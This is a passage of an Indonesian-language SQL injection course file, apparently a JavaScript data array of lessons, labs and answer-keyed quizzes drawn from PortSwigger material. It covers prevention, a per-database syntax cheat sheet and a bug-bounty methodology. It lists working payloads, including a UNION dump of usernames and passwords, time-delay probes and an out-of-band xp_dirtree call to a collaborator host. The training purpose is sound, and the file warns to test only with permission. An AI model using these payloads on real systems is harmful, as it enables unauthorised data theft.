          "Whitelist: hanya nilai yang terdaftar yang diterima (mis. sort ∈ {price, date, name})",
          "Logika berbeda: petakan input ke query yang sudah aman (mapping, bukan konkatenasi)",
        ]
      },
      {
        p: [
          "Bonus pencegahan di luar query: minimalkan error verbose di produksi (error-based jadi mati), dan gunakan prinsip least-privilege pada user database (dump users tadi tidak terjadi kalau koneksi DB-nya tidak punya akses ke tabel itu).",
        ],
      },
    ],
    lab: {
      title: "Lab 5 — Bedah kode sendiri",
      steps: [
        "Tulis dua versi endpoint mini di Python: satu rentan (f\"SELECT ... WHERE name='{q}'\"), satu aman (cursor.execute('... WHERE name=?', (q,))).",
        "Suntik ' OR 1=1-- ke keduanya. Amati: versi rentan mengembalikan semua baris; versi aman memperlakukan input sebagai string literal biasa.",
        "Tulis 3 kalimat di learning-journey-mu: kapan parameterized TIDAK bisa dipakai, dan apa penggantinya.",
      ],
      hint: "Di sqlite3 Python: parameter pakai '?' atau ':nama'. Kenapa input tetap aman walau berisi kutip? Karena driver mengirim data lewat jalur terpisah — kutipmu hanyalah karakter dalam data.",
    },
    quiz: [
      {
        q: "Kenapa parameterized query mencegah SQLi?",
        options: [
          "Karena mengenkripsi input",
          "Karena struktur query fix dan input dikirim sebagai data terpisah — input tak bisa mengubah struktur",
          "Karena memfilter karakter kutip",
          "Karena menjalankan query lebih lambat",
        ],
        answer: 1,
        why: "Placeholder menandai tempat data; driver DB mengirim data di kanal terpisah. Input yang berisi '-- atau OR 1=1 hanyalah teks biasa, bukan perintah.",
      },
      {
        q: "Kasus di mana parameterized query TIDAK bisa dipakai: input berada di…",
        options: [
          "Nilai WHERE",
          "Value INSERT",
          "Nama tabel / ORDER BY",
          "Parameter UPDATE",
        ],
        answer: 2,
        why: "Parameter hanya untuk data. Identifer (nama tabel/kolom/ORDER BY) bagian dari struktur query → solusinya whitelist nilai yang diizinkan atau logika mapping.",
      },
      {
        q: "Praktik yang Justru BERISIKO menurut panduan PortSwigger adalah…",
        options: [
          "Menambahkan whitelist untuk ORDER BY",
          "Memutuskan per-kasus mana data yang 'dipercaya' lalu tetap concatenate di kasus itu",
          "Menggunakan prepared statement di semua query",
          "Least-privilege untuk user database",
        ],
        answer: 1,
        why: "Keputusan kepercayaan per-kasus rapuh: asal data mudah salah diperkirakan, dan perubahan kode lain bisa menodai data 'terpercaya'. Query string harus konstanta, tanpa pengecualian.",
      },
      {
        q: "Report SQLi yang baik di bug bounty sebaiknya menyarankan…",
        options: [
          "Upgrade ke database berbayar",
          "Parameterized queries (plus whitelist untuk identifier) dan least-privilege DB user",
          "Menutup aplikasi sementara",
          "Menghapus fitur pencarian",
        ],
        answer: 1,
        why: "Rekomendasi yang tepat sasaran menunjukkan pemahaman root cause — naikkan kredibilitas report dan percepat triage.",
      },
    ],
  },

  // ---------------------------------------------------------- 07
  {
    slug: "sqli-07",
    tid: "ps-sqli-cheatsheet",
    title: "Cheat Sheet: Sintaks Per-Database yang Wajib Kamu Pegang",
    minutes: 8,
    source: {
      label: "PortSwigger — SQL injection cheat sheet",
      url: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
    },
    untukApa: [
      "Sintaks komentar, concatenation, dan query versi BEDA untuk tiap database. Tabel ringkas ini = reference saat mengerjakan lab & mencoba di bounty.",
    ],
    sections: [
      {
        h: "Tabel penting (dari cheat sheet PortSwigger)",
        table: {
          head: ["Kebutuhan", "Oracle", "MySQL", "PostgreSQL", "MSSQL"],
          rows: [
            ["Query versi", "SELECT banner FROM v$version", "SELECT @@version", "SELECT version()", "SELECT @@version"],
            ["Komentar", "--", "-- atau # (harus diikuti spasi utk --)", "--", "--"],
            ["Concat string", "'a'||'b'", "CONCAT('a','b')", "'a'||'b'", "'a'+'b'"],
            ["SELECT tanpa tabel", "wajib FROM DUAL", "boleh tanpa FROM", "boleh tanpa FROM", "boleh tanpa FROM"],
            ["Time delay", "DBMS_LOCK.SLEEP(10)", "SLEEP(10)", "pg_sleep(10)", "WAITFOR DELAY '0:0:10'"],
            ["Subquery delay (per kondisi)", "…", "…", "…", "IF(...) WAITFOR DELAY…"],
            ["Hostname via DNS/OOB", "UTL_INADDR / UTL_HTTP", "LOAD_FILE terbatas", "copy ke program", "xp_dirtree / master..xp_dirtree"],
          ],
        },
        callout:
          "Strategi nyata saat tak tahu DB-nya apa: kirim varian payload tiap DB satu per satu (contoh: komentar '--' vs '#') — yang merespons = jawabannya. Persis seperti teknik identifikasi versi di lesson 04.",
      },
      {
        h: "Payload pola yang sering dipakai",
        list: [
          "Deteksi: ' (error?), ' AND '1'='1 / ' AND '1'='2 (boolean diff)",
          "Kolom: ' ORDER BY N-- dan ' UNION SELECT NULL,...--",
          "String test: ' UNION SELECT 'a',NULL,...--",
          "Dump: ' UNION SELECT username||'~'||password FROM users-- (Oracle/PG)",
          "Blind time (MSSQL): '; IF(<cond>) WAITFOR DELAY '0:0:10'--",
          "OOB (MSSQL): '; exec master..xp_dirtree '//<sub>.collab.net/a'--",
        ],
      },
    ],
    lab: {
      title: "Lab 6 — Flashcard sintaks",
      steps: [
        "Buka cheat sheet (link sumber), baca sekali penuh.",
        "Tutup tab, tulis dari ingatan: query versi + komentar + concat untuk 4 DB utama.",
        "Cocokkan, ulangi besok (spaced repetition). Target: tanpa buka cheat sheet kamu tahu varian mana untuk DB mana.",
      ],
      hint: "Yang paling sering keliru: MySQL menuntut spasi setelah '--'. Kalau payload MySQL-mu gagal padahal logika benar, cek itu dulu.",
    },
    quiz: [
      {
        q: "Operator concatenation string di PostgreSQL adalah…",
        options: ["+", "||", "CONCAT()", "&"],
        answer: 1,
        why: "PostgreSQL dan Oracle pakai ||. MySQL pakai fungsi CONCAT(). MSSQL pakai +. Beda kecil yang sering membuat payload gagal di DB yang salah.",
      },
      {
        q: "Payload '--' kamu gagal di MySQL padahal logikanya benar. Penyebab paling mungkin…",
        options: [
          "MySQL tidak mendukung UNION",
          "-- di MySQL harus diikuti spasi (atau pakai #)",
          "MySQL tidak punya kutip satu",
          "Payload harus huruf kapital",
        ],
        answer: 1,
        why: "Keunikan MySQL: double-dash butuh trailing space agar dianggap komentar. Alternatif: '#'.",
      },
      {
        q: "Untuk memicu time delay di MSSQL, payload yang benar…",
        options: [
          "SLEEP(10)",
          "pg_sleep(10)",
          "WAITFOR DELAY '0:0:10'",
          "DBMS_LOCK.SLEEP(10)",
        ],
        answer: 2,
        why: "MSSQL: WAITFOR DELAY. MySQL: SLEEP(). PostgreSQL: pg_sleep(). Oracle: DBMS_LOCK.SLEEP().",
      },
      {
        q: "Saat tidak yakin DB-nya apa, strategi tercepat adalah…",
        options: [
          "Hanya pakai payload MSSQL",
          "Kirim varian sintaks tiap DB satu per satu, lihat yang merespons",
          "Langsung batal dan lapor bug lain",
          "Baca source code aplikasi",
        ],
        answer: 1,
        why: "Fingerprinting via payload — query versi / komentar / concat yang khas tiap DB sekaligus menjadi alat identifikasi. Respons yang berubah = DB teridentifikasi.",
      },
    ],
  },

  // ---------------------------------------------------------- 08
  {
    slug: "sqli-08",
    tid: "ps-sqli-methodology",
    title: "Metodologi Lengkap: Dari Pertama Buka Target Sampai Report",
    minutes: 12,
    source: {
      label: "PortSwigger — SQL injection (seluruh topik)",
      url: "https://portswigger.net/web-security/sql-injection",
    },
    untukApa: [
      "Menyatukan lesson 01–07 jadi satu alur kerja yang bisa kamu jalankan di lab berikutnya DAN di target bounty nyata.",
    ],
    sections: [
      {
        h: "Checklist metodologi SQLi",
        list: [
          "1. MAP — Kumpulkan semua entry point: parameter URL, body, cookie, header. Catat yang tampak di query (search, filter, sort, login, id).",
          "2. PROBE — Satu ' ke tiap titik; bandingkan respons (error, blank, redirect). Boolean pair (X' AND '1'='1 vs '2).",
          "3. CLASSIFY — Respons berubah dan hasil tampak? → UNION path. Diam? → blind (boolean → error → time → OAST).",
          "4. ENUMERATE — Versi DB → daftar tabel → daftar kolom → dump data menarik. Catat tiap payload yang bekerja.",
          "5. IMPACT — Buktikan dampak nyata (bukan cuma error): data sensitif terbaca, login bypass terbukti. Screenshot + langkah reproduksi.",
          "6. REPORT — Root cause (concate vs parameterize), impact, rekomendasi (prepared statement, whitelist identifier, least-privilege).",
        ],
        callout:
          "Aturan main: hanya pada lab yang kamu miliki izinnya (PortSwigger, program bounty dengan scope jelas). OR 1=1 pada target nyata tanpa izin = potensi kerusakan data + pelanggaran hukum.",
      },
      {
        h: "Peta lab track /sqli (urutan pengerjaan)",
        table: {
          head: ["Lab", "Skill", "Status tracker"],
          rows: [
            ["Retrieve hidden data", "komentar --, OR 1=1", "sqli-lab-dasar"],
            ["Login bypass", "subverting logic", "sqli-lab-dasar"],
            ["UNION: number of columns", "ORDER BY / NULL probe", "sqli-lab-dasar"],
            ["UNION: retrieve interesting data", "info_schema + dump", "sqli-lanjut"],
            ["Blind: conditional responses", "boolean extraction", "sqli-lanjut"],
          ],
        },
      },
      {
        h: "Sambungan ke bug bounty-mu"
      },
      {
        p: [
          "Di program nyata, SQLi sering muncul di tempat tak terduga: parameter filter lama, header yang di-log ke admin panel, fitur export/laporan, sorting kolom di dashboard. Setiap checklist metodologi di atas berlaku sama — yang berubah hanya permukaannya.",
          "Ketika menemukan kandidat: verifikasi dengan boolean pair dulu (paling aman), dokumentasikan tiap request-respons, dan simpan chain payload-mu — template yang sama akan mempercepat bug berikutnya.",
        ],
      },
    ],
    lab: {
      title: "Lab 7 — Jalankan metodologi penuh pada 1 lab pilihan",
      steps: [
        "Pilih satu lab blind dari link sumber yang belum kamu kerjakan.",
        "Terapkan checklist 1–5 tanpa melihat lesson lagi (kerjakan dari ingatan).",
        "Dokumentasikan dalam learning-journey: entry point, sinyal yang dipakai, chain payload, waktu yang dibutuhkan.",
        "Identifikasi satu langkah yang paling lambat kamu kerjakan — itu fokus latihan berikutnya.",
      ],
      hint: "Kalau stuck di CLASSIFY, kembalilah ke lesson 05: urutannya boolean → error → time → OAST. Satu per satu, jangan campur.",
    },
    quiz: [
      {
        q: "Urutan fase metodologi SQLi yang benar…",
        options: [
          "EXPLOIT → MAP → REPORT → PROBE",
          "MAP → PROBE → CLASSIFY → ENUMERATE → IMPACT → REPORT",
          "ENUMERATE → MAP → IMPACT → PROBE",
          "PROBE → REPORT → MAP → CLASSIFY",
        ],
        answer: 1,
        why: "Peta dulu permukaannya (MAP), uji sinyal (PROBE), tentukan jalur eksploitasi (CLASSIFY), ekstrak (ENUMERATE), buktikan dampak (IMPACT), baru dokumentasikan (REPORT).",
      },
      {
        q: "Pada target blind yang selalu merespons identik, urutan teknik yang benar…",
        options: [
          "UNION → boolean → time",
          "boolean → error → time → OAST",
          "OAST → boolean → UNION",
          "time → UNION → error",
        ],
        answer: 1,
        why: "Mulai dari kanal termudah (perilaku respons), naik ke error kondisional, lalu waktu, terakhir OAST — yang bekerja bahkan saat semuanya diam.",
      },
      {
        q: "Bukti dampak (impact) terbaik untuk report SQLi adalah…",
        options: [
          "Screenshot pesan error database",
          "Data sensitif yang terbaca / akses yang terbukti, dengan langkah reproduksi",
          "Payload yang kamu temukan di Google",
          "Estimasi risiko tanpa bukti",
        ],
        answer: 1,
        why: "Triage menilai DAMPAK. Error saja bukan bukti kerentanan dieksploitasi — tampilkan data/akses yang diperoleh beserta reproduksi yang jelas.",
      },
      {
        q: "Sebelum OR 1=1 ke parameter di aplikasi nyata, pertimbangan utamanya…",
        options: [
          "Apakah payload terlihat keren di laporan",
          "Apakah kondisi bisa nyangkut di UPDATE/DELETE (kerusakan data) dan apakah target ada dalam scope izin",
          "Apakah WAF akan log IP-nya",
          "Apakah respons cepat",
        ],
        answer: 1,
        why: "Warning eksplisit PortSwigger + etika bounty: hanya target ber-scope, dan kondisi selalu-true pada query mutasi = risiko kerusakan permanen.",
      },
    ],
  },
];
